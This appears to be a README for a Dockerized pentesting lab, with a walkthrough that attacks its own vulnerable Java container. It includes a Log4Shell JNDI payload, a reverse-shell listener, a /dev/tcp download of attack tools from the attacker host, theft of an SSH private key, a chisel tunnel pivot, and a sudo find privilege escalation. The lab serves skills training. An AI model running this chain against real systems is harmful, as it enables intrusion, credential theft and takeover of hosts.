# Dockerized pentesting environment
Dockerized java environment to test your skills in pentesting

## Build

```console
docker pull openjdk:11.0.13-jre-slim-buster
docker save openjdk:11.0.13-jre-slim-buster -o java.tar
docker build -t dind .
```

## Run

```console
docker run -it --rm --name dind -p 31337:31337 --privileged dind
```

## Initial foothold

```console
nmap -v -p- 172.18.0.1
```

```console
rlwrap nc -lvnp 4444
```

```console
# https://github.com/TheArqsz/CVE-2021-44228.git
poc.sh -i 172.17.0.1 -l 12344 -t 18000 -e reverse --listener-port 4444
```

```console
curl 'http://localhost:31337/?name=%24%7Bjndi%3Aldap%3A%2F%2F172.17.0.1%3A12344%2Fa%7D' --compressed -H 'Connection: keep-alive'
```

```bash
# Interactive shell that is not /bin/sh
bash -i
```


## Pivot

```bash

# How to check if it is container - run this and a lot of /docker will appear
cat /proc/1/cgroups

# Curl function because it is not available in container
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

# Now download tools - you have to spin up http server on your host (e.g. python -m http.server 8000)
cd /tmp
__curl http://172.17.0.1:8000/chisel > chisel
__curl http://172.17.0.1:8000/nc > nc
__curl http://172.17.0.1:8000/portscan.sh > portscan.sh
chmod +x chisel nc portscan.sh
```

```console
# Now you can scan docker host for ports
./portscan.sh 172.18.0.1
# There is SSH
# Now we look for suspicious files
```
```
# /mike is not a casual directory
# It contains .ssh directory so probably it is a volume
# It contains id_rsa keys
cat /mike/.ssh/id_rsa
```
```
# On your host, spin up chisel proxy server
./chisel server --reverse
```

```
# In container, execute client that proxies port 22 from 172.18.0.1 to you on port 2222
./chisel client --max-retry-count=2 172.17.0.1:8080 R:2222:172.18.0.1:22
```

```
# From your host, execute ssh command
ssh -i mike_id_rsa mike@localhost -p2222
```

## Privesc

```
sudo -l 
sudo /usr/bin/find . -exec /bin/bash \; -quit
```
